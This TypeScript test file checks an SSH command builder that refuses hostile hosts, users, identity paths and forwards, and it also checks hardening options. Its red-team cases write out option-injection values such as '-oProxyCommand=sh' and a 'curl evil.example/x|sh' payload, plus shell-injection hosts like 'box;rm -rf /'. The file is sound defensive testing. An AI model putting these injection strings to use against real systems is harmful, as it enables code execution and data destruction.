/**
 * ssh-target.test.ts — the argv builder is a security boundary, so it is tested like one.
 *
 * `ssh` has several options that run a command on the LOCAL machine before anything is sent
 * anywhere — `-o ProxyCommand=…`, `LocalCommand` with `PermitLocalCommand`, `-F` pointing at a
 * config that sets either. The repo's own exec registry already names `ssh -o ProxyCommand` as
 * an arbitrary-code escape. A hostname that reaches argv unvalidated is therefore not a bad
 * input, it is code execution — so the red-team cases below are the point of this file, not an
 * afterthought at the end of it.
 */
import assert from "node:assert/strict";
import { test } from "node:test";

import {
  fixedSshOptions,
  formatSshTarget,
  parseSshDestination,
  sshArgs,
  sshKeyscanArgs,
  validateSshTarget,
} from "./ssh-target.js";

/* ── red team: a host that is really an option ──────────────────────────────────────────────*/

const HOSTILE_HOSTS: readonly [string, string][] = [
  ["-oProxyCommand=sh", 'the joined -o form, which a naive `=== "-o"` check misses entirely'],
  ["-o ProxyCommand=sh", "the spaced form"],
  ["-oProxyCommand=curl evil.example/x|sh", "a full exfiltration payload"],
  ["-F/tmp/evil_ssh_config", "a config file that can set ProxyCommand"],
  ["-E/tmp/log", "any option at all in host position"],
  ["--", "the terminator itself"],
  ["-", "a bare dash"],
  ["-ProxyJump=attacker", "a jump host the user never named"],
];

for (const [host, why] of HOSTILE_HOSTS) {
  test(`REFUSES a host that is an ssh option: ${JSON.stringify(host)} — ${why}`, () => {
    const v = validateSshTarget({ host });
    assert.equal(v.ok, false, `${host} must not validate`);
    // And the builder must throw rather than fall back to something "safe": a default host
    // would mean connecting to a machine nobody named.
    assert.throws(() => sshArgs({ host }), /refusing to build an ssh command/);
  });
}

test("a hostile host is refused even when it reaches parseSshDestination through user@", () => {
  const v = parseSshDestination("root@-oProxyCommand=sh");
  assert.equal(v.ok, false);
});

test("a user name may not be an option either", () => {
  assert.equal(validateSshTarget({ host: "box.lan", user: "-oProxyCommand=sh" }).ok, false);
});

test("an identity path may not be an option, nor carry a control character", () => {
  assert.equal(validateSshTarget({ host: "box.lan", identityFile: "-oProxyCommand=sh" }).ok, false);
  assert.equal(
    validateSshTarget({ host: "box.lan", identityFile: "/k\nProxyCommand=sh" }).ok,
    false,
  );
});

test("shell metacharacters in a host are refused, not escaped", () => {
  // Escaping is the wrong instinct here: a silently rewritten host is a different machine.
  for (const h of ["box;rm -rf /", "box`id`", "box$(id)", "box|sh", "box&", "a b"]) {
    assert.equal(validateSshTarget({ host: h }).ok, false, `${h} must not validate`);
  }
});

/* ── the argv itself ────────────────────────────────────────────────────────────────────────*/

test("the destination is always preceded by `--`, so it can never be read as a flag", () => {
  const args = sshArgs({ host: "gpu-box.lan" }, { remoteCommand: "echo hi" });
  const dashDash = args.indexOf("--");
  assert.ok(dashDash > 0, "-- must be present");
  assert.equal(args[dashDash + 1], "gpu-box.lan", "the host follows it immediately");
  assert.equal(args[dashDash + 2], "echo hi", "and the remote command follows the host");
});

test("every invocation carries the fixed options that close a config file's escapes", () => {
  const args = sshArgs({ host: "gpu-box.lan" });
  const joined = args.join(" ");
  // BatchMode: a password prompt on a non-interactive spawn is an indefinite hang.
  assert.match(joined, /BatchMode=yes/);
  // PermitLocalCommand: disables LocalCommand whatever ~/.ssh/config says.
  assert.match(joined, /PermitLocalCommand=no/);
  // ClearAllForwardings: neutralises forwards inherited from the user's own config.
  assert.match(joined, /ClearAllForwardings=yes/);
  // ExitOnForwardFailure: a tunnel that silently failed to bind is worse than no tunnel.
  assert.match(joined, /ExitOnForwardFailure=yes/);
  assert.match(joined, /ConnectTimeout=\d+/);
});

test("host-key checking is strict by default and only ever relaxed to accept-new", () => {
  assert.match(fixedSshOptions({ host: "b.lan" }).join(" "), /StrictHostKeyChecking=yes/);
  assert.match(
    fixedSshOptions({ host: "b.lan", acceptNewHostKey: true }).join(" "),
    /StrictHostKeyChecking=accept-new/,
  );
  // `accept-new` accepts an UNKNOWN key; it still refuses a CHANGED one, which is the case the
  // check exists for. There is no option here that would disable it outright.
  assert.ok(!fixedSshOptions({ host: "b.lan", acceptNewHostKey: true }).includes("no"));
});

test("a forward binds to 127.0.0.1 explicitly, never to every interface", () => {
  const args = sshArgs(
    { host: "gpu-box.lan" },
    {
      noRemoteCommand: true,
      forward: { localPort: 45000, remoteHost: "127.0.0.1", remotePort: 11434 },
    },
  );
  const i = args.indexOf("-L");
  assert.ok(i >= 0);
  // Without the bind address ssh honours GatewayPorts, and the tunnel would publish the remote
  // model server — which has no authentication at all — to the whole local network.
  assert.equal(args[i + 1], "127.0.0.1:45000:127.0.0.1:11434");
});

test("a forward to a hostile remote host is refused", () => {
  assert.throws(
    () =>
      sshArgs(
        { host: "gpu-box.lan" },
        { forward: { localPort: 45000, remoteHost: "-oProxyCommand=sh", remotePort: 11434 } },
      ),
    /refusing to forward/,
  );
});

test("an out-of-range port is refused in every position", () => {
  assert.equal(validateSshTarget({ host: "b.lan", port: 0 }).ok, false);
  assert.equal(validateSshTarget({ host: "b.lan", port: 70000 }).ok, false);
  assert.equal(validateSshTarget({ host: "b.lan", port: 1.5 }).ok, false);
  assert.throws(() =>
    sshArgs(
      { host: "b.lan" },
      { forward: { localPort: 0, remoteHost: "127.0.0.1", remotePort: 1 } },
    ),
  );
});

test("an explicit identity also pins IdentitiesOnly, so the agent does not offer every key", () => {
  const args = sshArgs({ host: "b.lan", identityFile: "/Users/me/.ssh/id_ed25519" });
  assert.ok(args.includes("-i"));
  // A server that logs offered public keys would otherwise learn the user's whole key set.
  assert.match(args.join(" "), /IdentitiesOnly=yes/);
});

/* ── parsing what a user types ──────────────────────────────────────────────────────────────*/

test("parses user@host:port", () => {
  const v = parseSshDestination("phoenix@gpu-box.lan:2222");
  assert.ok(v.ok);
  assert.deepEqual(v.target, { host: "gpu-box.lan", user: "phoenix", port: 2222 });
});

test("a bare IPv6 literal keeps its colons; a bracketed one may carry a port", () => {
  const bare = parseSshDestination("fe80::1");
  assert.ok(bare.ok, "a bare IPv6 address must parse");
  assert.equal(bare.target.host, "fe80::1");
  assert.equal(bare.target.port, undefined, "its colons are not a port");

  const bracketed = parseSshDestination("[fe80::1]:2222");
  assert.ok(bracketed.ok);
  assert.equal(bracketed.target.host, "fe80::1");
  assert.equal(bracketed.target.port, 2222);
});

test("formatSshTarget round-trips what parseSshDestination accepts", () => {
  for (const s of ["gpu-box.lan", "me@gpu-box.lan", "me@gpu-box.lan:2222", "[fe80::1]:22"]) {
    const v = parseSshDestination(s);
    assert.ok(v.ok, `${s} must parse`);
    const again = parseSshDestination(formatSshTarget(v.target));
    assert.ok(again.ok, `${formatSshTarget(v.target)} must re-parse`);
    assert.deepEqual(again.target, v.target);
  }
});

test("keyscan args carry no -o options and no terminator", () => {
  const args = sshKeyscanArgs({ host: "gpu-box.lan", port: 2222 });
  assert.deepEqual(args, ["-T", "5", "-p", "2222", "gpu-box.lan"]);
  assert.ok(
    !args.includes("-o"),
    "ssh-keyscan does not take -o; sharing the builder would weaken it",
  );
});

test("a hostile host is refused by the keyscan builder too", () => {
  assert.throws(() => sshKeyscanArgs({ host: "-oProxyCommand=sh" }), /refusing to scan/);
});

test("an ordinary host, user and alias all validate", () => {
  for (const h of ["gpu-box.lan", "192.168.1.50", "gpu-box", "my-ssh-alias", "a.b.c.example.com"]) {
    assert.equal(validateSshTarget({ host: h }).ok, true, `${h} should validate`);
  }
});
